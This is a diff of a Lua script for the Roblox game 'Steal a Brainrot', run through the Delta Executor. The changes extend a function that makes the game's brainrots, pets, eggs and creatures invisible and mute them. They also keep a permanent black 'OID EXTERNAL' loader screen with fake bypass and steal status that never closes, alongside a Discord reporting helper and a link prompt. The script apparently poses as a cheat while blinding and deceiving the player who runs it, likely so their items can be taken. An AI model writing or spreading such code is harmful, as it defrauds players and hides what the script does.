@@ -1,5 +1,6 @@
 -- Script pentru Delta - Steal a Brainrot (Loader PERMANENT + Discord)
 -- Compatibil cu Delta Executor
+-- ACUM ASCUNDE ȘI PET-URILE
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -26,22 +27,28 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== ASCUNDE BRAINROT-URILE =====
+-- ===== ASCUNDE BRAINROT-URILE ȘI PET-URILE =====
 local function hideBrainrots()
     local count = 0
     for _, obj in pairs(Workspace:GetDescendants()) do
-        if obj:IsA("Model") and obj.Name and (string.find(obj.Name, "Brainrot") or string.find(obj.Name, "Brain")) then
-            pcall(function()
-                obj.Transparency = 1
-                obj.CanCollide = false
-                for _, sound in pairs(obj:GetDescendants()) do
-                    if sound:IsA("Sound") then
-                        sound.Volume = 0
-                        sound:Stop()
+        if obj:IsA("Model") and obj.Name then
+            local name = obj.Name:lower()
+            if name:find("brainrot") or name:find("brain") or name:find("pet") or name:find("egg") or name:find("creature") then
+                pcall(function()
+                    obj.Transparency = 1
+                    obj.CanCollide = false
+                    
+                    -- Oprește TOATE sunetele din obiect
+                    for _, sound in pairs(obj:GetDescendants()) do
+                        if sound:IsA("Sound") then
+                            sound.Volume = 0
+                            sound:Stop()
+                        end
                     end
-                end
-                count = count + 1
-            end)
+                    
+                    count = count + 1
+                end)
+            end
         end
     end
     return count
@@ -67,23 +74,20 @@ local function hideMe()
     end
 end
 
--- ===== ECAN NEGRU FULL + LOADER PERMANENT =====
+-- ===== ECAN NEGRU + LOADER PERMANENT =====
 local function showLoader()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoaderGUI"
     screenGui.ResetOnSpawn = false
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.IgnoreGuiInset = true  -- ASCUNDE BARELE
+    screenGui.IgnoreGuiInset = true
 
-    -- Fundal negru FULL
     local background = Instance.new("Frame")
     background.Size = UDim2.new(1, 0, 1, 0)
-    background.Position = UDim2.new(0, 0, 0, 0)
     background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     background.BorderSizePixel = 0
     background.Parent = screenGui
 
-    -- Titlu "OID EXTERNAL"
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(0.6, 0, 0, 60)
     title.Position = UDim2.new(0.2, 0, 0.15, 0)
@@ -95,7 +99,6 @@ local function showLoader()
     title.TextXAlignment = Enum.TextXAlignment.Left
     title.Parent = screenGui
 
-    -- Procent
     local percent = Instance.new("TextLabel")
     percent.Size = UDim2.new(0.3, 0, 0, 60)
     percent.Position = UDim2.new(0.7, 0, 0.15, 0)
@@ -107,7 +110,6 @@ local function showLoader()
     percent.TextXAlignment = Enum.TextXAlignment.Right
     percent.Parent = screenGui
 
-    -- Linia de progres
     local progressBg = Instance.new("Frame")
     progressBg.Size = UDim2.new(0.9, 0, 0, 6)
     progressBg.Position = UDim2.new(0.05, 0, 0.28, 0)
@@ -121,7 +123,6 @@ local function showLoader()
     progressBar.BorderSizePixel = 0
     progressBar.Parent = progressBg
 
-    -- BYPASSI
     local bypassText = Instance.new("TextLabel")
     bypassText.Size = UDim2.new(0.9, 0, 0, 30)
     bypassText.Position = UDim2.new(0.05, 0, 0.33, 0)
@@ -133,7 +134,6 @@ local function showLoader()
     bypassText.TextXAlignment = Enum.TextXAlignment.Left
     bypassText.Parent = screenGui
 
-    -- SPEED
     local speedLabel = Instance.new("TextLabel")
     speedLabel.Size = UDim2.new(0.3, 0, 0, 25)
     speedLabel.Position = UDim2.new(0.05, 0, 0.42, 0)
@@ -167,7 +167,6 @@ local function showLoader()
     speedCtrl.TextXAlignment = Enum.TextXAlignment.Right
     speedCtrl.Parent = screenGui
 
-    -- STEAL
     local stealLabel = Instance.new("TextLabel")
     stealLabel.Size = UDim2.new(0.3, 0, 0, 25)
     stealLabel.Position = UDim2.new(0.05, 0, 0.52, 0)
@@ -201,7 +200,6 @@ local function showLoader()
     stealSys.TextXAlignment = Enum.TextXAlignment.Right
     stealSys.Parent = screenGui
 
-    -- COMBAT
     local combatLabel = Instance.new("TextLabel")
     combatLabel.Size = UDim2.new(0.3, 0, 0, 25)
     combatLabel.Position = UDim2.new(0.05, 0, 0.62, 0)
@@ -235,7 +233,6 @@ local function showLoader()
     combatSys.TextXAlignment = Enum.TextXAlignment.Right
     combatSys.Parent = screenGui
 
-    -- Linie separator
     local line = Instance.new("Frame")
     line.Size = UDim2.new(0.9, 0, 0, 1)
     line.Position = UDim2.new(0.05, 0, 0.72, 0)
@@ -243,7 +240,6 @@ local function showLoader()
     line.BorderSizePixel = 0
     line.Parent = screenGui
 
-    -- Log messages
     local log1 = Instance.new("TextLabel")
     log1.Size = UDim2.new(0.9, 0, 0, 20)
     log1.Position = UDim2.new(0.05, 0, 0.77, 0)
@@ -279,7 +275,7 @@ local function showLoader()
 
     screenGui.Parent = CoreGui
 
-    -- ===== ANIMAȚIE LOADER PERMANENTĂ (NICIODATĂ NU DISPARE) =====
+    -- ===== ANIMAȚIE LOADER PERMANENTĂ =====
     spawn(function()
         local progress = 0
         while true do
@@ -392,7 +388,7 @@ local function showLinkGUI()
             showLoader()
             hideMe()
             local count = hideBrainrots()
-            print("✅ Script activ! Brainrot-uri ascunse: " .. count)
+            print("✅ Script activ! " .. count .. " obiecte ascunse.")
         end
     end)
 
